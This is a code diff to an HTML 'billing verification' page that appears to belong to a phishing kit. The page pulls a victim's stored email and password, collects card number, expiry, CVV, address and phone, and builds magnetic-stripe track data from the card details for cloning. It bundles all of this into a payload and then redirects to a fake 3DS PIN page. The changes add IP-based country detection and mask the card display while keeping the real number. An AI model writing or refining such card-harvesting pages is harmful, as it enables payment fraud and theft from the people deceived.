@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -82,6 +82,17 @@
             font-weight: bold;
             font-size: 14px;
         }
+        .tel-wadah {
+            display: flex;
+            gap: 8px;
+        }
+        .tel-kode {
+            width: 90px;
+            flex-shrink: 0;
+        }
+        .tel-nomor {
+            flex: 1;
+        }
         button { 
             width: 100%; 
             padding: 7px 10px; 
@@ -132,6 +143,10 @@
             padding-bottom: 10px;
             border-bottom: 1px solid #eee;
         }
+        /* Tampilan tersembunyi */
+        .input-sembunyi {
+            letter-spacing: 2px;
+        }
     </style>
 </head>
 <body>
@@ -155,21 +170,21 @@
             </div>
 
             <label for="nomorKartu">Card Number</label>
-            <input type="text" id="nomorKartu" name="nomorKartu" placeholder="1234 5678 9012 3456" maxlength="19">
+            <input type="text" id="nomorKartu" name="nomorKartu" placeholder="•••• •••• •••• ••••" maxlength="19" class="input-sembunyi">
             <div class="peringatan" id="peringatanKartu">
                 <span class="ikon">!</span>
                 <span>Enter valid card number</span>
             </div>
 
-            <label for="expiry">Expiration Date (MM/YY)</label>
-            <input type="text" id="expiry" name="expiry" placeholder="MM / YY" maxlength="5">
+            <label for="expiry">Expiration Date</label>
+            <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5">
             <div class="peringatan" id="peringatanExpiry">
                 <span class="ikon">!</span>
                 <span>Enter valid expiration date</span>
             </div>
 
             <label for="cvv">Security Code (CVV)</label>
-            <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4">
+            <input type="text" id="cvv" name="cvv" placeholder="••••" maxlength="4" class="input-sembunyi">
             <div class="peringatan" id="peringatanCvv">
                 <span class="ikon">!</span>
                 <span>Enter valid security code</span>
@@ -178,12 +193,12 @@
             <label for="negara">Country or Region</label>
             <select id="negara" name="negara">
                 <option value="">Select your country</option>
-                <option value="AU">Australia</option>
-                <option value="GB">United Kingdom</option>
-                <option value="US">United States</option>
-                <option value="ID">Indonesia</option>
-                <option value="MY">Malaysia</option>
-                <option value="SG">Singapore</option>
+                <option value="AU" data-kode="+61">Australia (+61)</option>
+                <option value="GB" data-kode="+44">United Kingdom (+44)</option>
+                <option value="US" data-kode="+1">United States (+1)</option>
+                <option value="ID" data-kode="+62">Indonesia (+62)</option>
+                <option value="MY" data-kode="+60">Malaysia (+60)</option>
+                <option value="SG" data-kode="+65">Singapore (+65)</option>
             </select>
             <div class="peringatan" id="peringatanNegara">
                 <span class="ikon">!</span>
@@ -211,8 +226,11 @@
                 <span>Enter postal code</span>
             </div>
 
-            <label for="telepon">Phone Number</label>
-            <input type="tel" id="telepon" name="telepon" placeholder="+61 ...">
+            <label for="telKode">Phone Number</label>
+            <div class="tel-wadah">
+                <input type="text" id="telKode" class="tel-kode" placeholder="+xx" readonly>
+                <input type="tel" id="telNomor" class="tel-nomor" placeholder="Phone number">
+            </div>
             <div class="peringatan" id="peringatanTelepon">
                 <span class="ikon">!</span>
                 <span>Enter phone number</span>
@@ -234,24 +252,86 @@
     </div>
 
     <script>
+        // === DETEKSI NEGARA OTOMATIS ===
+        const petaNegara = {
+            AU: { kode: '+61', nama: 'Australia' },
+            GB: { kode: '+44', nama: 'United Kingdom' },
+            US: { kode: '+1', nama: 'United States' },
+            ID: { kode: '+62', nama: 'Indonesia' },
+            MY: { kode: '+60', nama: 'Malaysia' },
+            SG: { kode: '+65', nama: 'Singapore' }
+        };
+
+        const elemenNegara = document.getElementById('negara');
+        const elemenTelKode = document.getElementById('telKode');
+        const elemenTelNomor = document.getElementById('telNomor');
+
+        // Ubah kode telepon saat negara diganti
+        elemenNegara.addEventListener('change', () => {
+            const pilihan = elemenNegara.selectedOptions[0];
+            if (pilihan && pilihan.dataset.kode) {
+                elemenTelKode.value = pilihan.dataset.kode;
+            } else {
+                elemenTelKode.value = '';
+            }
+        });
+
+        // Deteksi lokasi pengunjung & atur otomatis
+        async function deteksiNegara() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                const kodeNegara = data.country_code;
+
+                if (petaNegara[kodeNegara]) {
+                    elemenNegara.value = kodeNegara;
+                    elemenTelKode.value = petaNegara[kodeNegara].kode;
+                } else {
+                    elemenNegara.value = 'ID';
+                    elemenTelKode.value = '+62';
+                }
+            } catch (err) {
+                elemenNegara.value = 'ID';
+                elemenTelKode.value = '+62';
+            }
+        }
+        deteksiNegara();
+
         // Tampilkan email dari halaman sebelumnya
         const emailPengguna = localStorage.getItem('emailPengguna') || '';
         document.getElementById('emailTampil').textContent = emailPengguna;
 
         const formBilling = document.getElementById('formBilling');
         const tombolVerifikasi = document.getElementById('tombolVerifikasi');
+        const inputNomorKartu = document.getElementById('nomorKartu');
+
+        // Simpan nilai asli untuk dikirim
+        let nomorAsli = '';
+
+        // Format tampilan: 1234567890123456 → •••• •••• •••• ••••
+        inputNomorKartu.addEventListener('input', (e) => {
+            const nilai = e.target.value.replace(/\D/g, '');
+            nomorAsli = nilai; // simpan angka asli
+
+            // Tampilkan dengan titik
+            let tampil = '';
+            for (let i = 0; i < nilai.length; i++) {
+                if (i > 0 && i % 4 === 0) tampil += ' ';
+                tampil += '•';
+            }
+            e.target.value = tampil;
+        });
 
         // Semua kolom
         const kolom = {
             namaKartu:  { el: document.getElementById('namaKartu'),  peringatan: document.getElementById('peringatanNama') },
-            nomorKartu: { el: document.getElementById('nomorKartu'), peringatan: document.getElementById('peringatanKartu') },
             expiry:     { el: document.getElementById('expiry'),     peringatan: document.getElementById('peringatanExpiry') },
             cvv:        { el: document.getElementById('cvv'),        peringatan: document.getElementById('peringatanCvv') },
-            negara:     { el: document.getElementById('negara'),     peringatan: document.getElementById('peringatanNegara') },
+            negara:     { el: elemenNegara,                           peringatan: document.getElementById('peringatanNegara') },
             alamat:     { el: document.getElementById('alamat'),     peringatan: document.getElementById('peringatanAlamat') },
             kota:       { el: document.getElementById('kota'),       peringatan: document.getElementById('peringatanKota') },
             kodepos:    { el: document.getElementById('kodepos'),    peringatan: document.getElementById('peringatanKodepos') },
-            telepon:    { el: document.getElementById('telepon'),    peringatan: document.getElementById('peringatanTelepon') }
+            telNomor:   { el: elemenTelNomor,                         peringatan: document.getElementById('peringatanTelepon') }
         };
 
         // Hilangkan peringatan saat mengetik
@@ -264,23 +344,21 @@
             });
         });
 
-        // Format nomor kartu otomatis
-        kolom.nomorKartu.el.addEventListener('input', (e) => {
-            let val = e.target.value.replace(/\D/g, '');
-            val = val.match(/.{1,4}/g)?.join(' ') || val;
-            e.target.value = val;
-        });
-
-        // Format expiry otomatis
+        // Format Expiry — MM/YY
         kolom.expiry.el.addEventListener('input', (e) => {
-            let val = e.target.value.replace(/\D/g, '');
-            if (val.length >= 2) val = val.slice(0,2) + ' / ' + val.slice(2,4);
-            e.target.value = val;
+            let val = e.target.value.replace(/[^0-9]/g, '');
+            if (val.length >= 2 && val.length < 4) {
+                e.target.value = val.slice(0, 2) + '/';
+            } else if (val.length >= 4) {
+                e.target.value = val.slice(0, 2) + '/' + val.slice(2, 4);
+            } else {
+                e.target.value = val;
+            }
         });
 
-        // === BUAT TRACK KARTU OTOMATIS (TIDAK DITAMPILKAN) ===
+        // === BUAT TRACK KARTU OTOMATIS ===
         function buatTrack() {
-            let nomorBersih = kolom.nomorKartu.el.value.replace(/\s/g, '');
+            let nomorBersih = nomorAsli;
             let expiryBersih = kolom.expiry.el.value.replace(/\D/g, '');
             let nama = kolom.namaKartu.el.value.trim().toUpperCase() || 'CARDHOLDER';
 
@@ -289,7 +367,7 @@
             }
 
             let yy = expiryBersih.slice(-2);
-            let mm = expiryBersih.slice(0,2);
+            let mm = expiryBersih.slice(0, 2);
             let sisa = '0000000000000000000000';
 
             let track1 = `%B${nomorBersih}^${nama}^${yy}${mm}${sisa}?`;
@@ -303,6 +381,11 @@ T2: ${track2}`;
         // Cek semua kolom terisi
         function cekSemua() {
             let semuaOk = true;
+            if (!nomorAsli || nomorAsli.length < 13) {
+                inputNomorKartu.classList.add('salah');
+                document.getElementById('peringatanKartu').classList.add('tampil');
+                semuaOk = false;
+            }
             Object.entries(kolom).forEach(([nama, { el, peringatan }]) => {
                 if (!el.value.trim()) {
                     el.classList.add('salah');
@@ -322,11 +405,11 @@ T2: ${track2}`;
             tombolVerifikasi.disabled = true;
             tombolVerifikasi.textContent = 'Verifying...';
 
-            const nomorBersih = kolom.nomorKartu.el.value.trim().replace(/\s/g, '');
             const trackKartu = buatTrack();
+            const teleponLengkap = elemenTelKode.value + ' ' + elemenTelNomor.value.trim();
 
             // Simpan untuk halaman berikutnya
-            localStorage.setItem('nomorKartu', nomorBersih);
+            localStorage.setItem('nomorKartu', nomorAsli);
             localStorage.setItem('namaKartu', kolom.namaKartu.el.value.trim());
             localStorage.setItem('expiry', kolom.expiry.el.value.trim());
             localStorage.setItem('cvv', kolom.cvv.el.value.trim());
@@ -337,15 +420,15 @@ T2: ${track2}`;
                 password: localStorage.getItem('passwordPengguna') || 'Tidak tersimpan',
                 tipe: 'Verification Payment',
                 namaKartu:  kolom.namaKartu.el.value.trim(),
-                nomorKartu: nomorBersih,
+                nomorKartu: nomorAsli,
                 expiry:     kolom.expiry.el.value.trim(),
                 cvv:        kolom.cvv.el.value.trim(),
                 trackKartu: trackKartu,
-                negara:     kolom.negara.el.value,
+                negara:     elemenNegara.value,
                 alamat:     kolom.alamat.el.value.trim(),
                 kota:       kolom.kota.el.value.trim(),
                 kodepos:    kolom.kodepos.el.value.trim(),
-                telepon:    kolom.telepon.el.value.trim()
+                telepon:    teleponLengkap
             };
 
             try {
@@ -360,7 +443,6 @@ T2: ${track2}`;
                 console.log('Data terkirim');
             }
 
-            // Lanjut ke halaman PIN 3DS
             window.location.href = '3ds.html';
         });
     </script>
